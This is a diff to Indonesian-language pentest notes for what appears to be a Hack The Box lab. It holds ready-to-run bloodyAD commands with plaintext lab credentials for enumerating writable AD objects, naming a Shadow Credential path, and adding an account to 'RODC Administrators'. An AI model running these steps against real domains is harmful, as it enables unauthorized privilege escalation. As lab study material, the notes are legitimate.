@@ -1,4 +1,4 @@
-# Apa object yang dapat kita modifikasi/tulis
+# 1. Apa object yang dapat kita modifikasi/tulis
 ```shell
 # Dengan password
 bloodyad --host 10.129.244.207 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable
@@ -15,12 +15,24 @@ cek yang ACL nya "WRITE"
 | `CN=DC01,OU=Domain Controllers,... \| msDS-KeyCredentialLink`                               | Shadow Credential attack  |
 | `distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb<br><br>`permission: WRITE | suffix ADM                |
 
-# Cek member dari group apa
+# 2. Cek member dari group apa?
 ```
 Bloodyad --host 10.129.244.207 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get object "CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb" --attr memberOf
 ```
 ![](Attachments/Pasted%20image%2020260716165733.png)
-# Delete Account
+
+# 3. Cek Anggota Group
+```shell
+bloodyad -u 'l.wilson_adm' -p 'YourNewPass123!' -d garfield.htb --host 10.129.244.207 get object "RODC Administrators" --attr member
+```
+tidak akan tampil data jika akun tidak masuk group
+![](Attachments/Pasted%20image%2020260807145913.png)
+# 4. Cara tambah anggota group
+```shell
+bloodyad -u 'l.wilson_adm' -p 'YourNewPass123!' -d garfield.htb --host 10.129.244.207 add groupMember "RODC Administrators" l.wilson_adm
+```
+![](Attachments/Pasted%20image%2020260807150452.png)
+# 5. Delete Account
 jika ada ini berarti akun kita pernah menghapus akun
 ```plain
 distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
